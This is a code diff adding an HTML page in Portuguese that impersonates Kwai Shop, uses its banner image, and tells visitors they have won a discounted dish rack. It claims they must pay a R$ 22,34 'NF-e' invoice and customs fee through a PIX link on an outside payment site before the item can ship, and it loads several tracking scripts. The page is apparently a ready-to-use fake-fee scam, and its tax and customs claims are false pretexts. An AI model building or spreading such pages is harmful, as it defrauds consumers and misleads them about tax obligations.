@@ -1,0 +1,81 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kwai Shop</title>
+    <link rel="stylesheet" href="css/styles.css">
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="9bcdc6dc-171c-4a65-8733-f908e8198551"
+	>
+	</script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    
+    <!-- Mangofy API Integration -->
+    <script src="js/mangofy-config.js"></script>
+
+
+    
+</head>
+<body>
+    <div class="container">
+        <div style="width: 100%; text-align: center; margin: auto;">
+            <img src="https://cdn-static.kwai.net/kos/s101/nlav11312/shop/b/img/brand-banner.3f2f57a3.png" alt="Kwai Shop" class="logo" style="width: 100%; max-width: 300px;">
+        </div>
+
+        <div class="amount">
+            <div class="amount-label">Parabéns!</div>
+            <div class="amount-label">
+                Você acabou de garantir Escorredor Pro Five – Prato e Louça Suspenso para Armário com desconto através do Kwai Shop! Para concluir, basta realizar o pagamento da emissão da Nota Fiscal do seu produto.
+            </div>
+        </div>
+
+        <div class="tax-box">
+  <div class="tax-box-title">NF-e (Taxa de Emissão de Nota Fiscal)</div>
+  <div class="amount-value">R$ 22,34</div>
+</div>
+
+<button id="paymentButton" class="button" onclick="window.location.href='https://pay.sunize.com.br/JpckzPFq'">
+  Gerar PIX para Pagamento
+</button>
+
+<div id="loadingMessage">Gerando código PIX...</div>
+
+<!-- Container do código PIX -->
+<div id="pixCodeContainer" style="display: none;">
+  <div class="pix-header">
+    <strong>Pague com PIX</strong>
+    <div class="countdown">Expira em: <span id="timer">08:19</span></div>
+  </div>
+
+  <!-- QR Code Image (se disponível) -->
+  <div style="text-align: center; margin: 20px 0;">
+    <img id="pixQrCodeImage" style="display: none; max-width: 250px; margin: 0 auto;" alt="QR Code PIX">
+  </div>
+
+  <div class="pix-instructions">
+    1. Copie o código PIX abaixo<br>
+    2. Abra o app do seu banco<br>
+    3. Escolha pagar com PIX Copia e Cola<br>
+    4. Cole o código e confirme
+  </div>
+
+  <input type="text" id="pixCode" readonly="">
+  <button class="copy-btn" onclick="copyPixCode()">COPIAR CÓDIGO PIX</button>
+</div>
+
+
+
+        <div class="info-box">
+            Para liberar o envio do seu kit importada do Kwai Shop, é necessário pagar a NF-e (Taxa de Emissão de Nota Fiscal) no valor de R$ 22,34. 
+            Essa taxa cobre os custos de importação, liberação alfandegária e emissão fiscal exigida para entrada do produto no país. 
+            <strong>Sem o pagamento, a liberação da Receita não é feita e o seu produto não pode ser enviado.</strong>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+<script src="/assets/tracker.js" defer></script>
+</body></html>
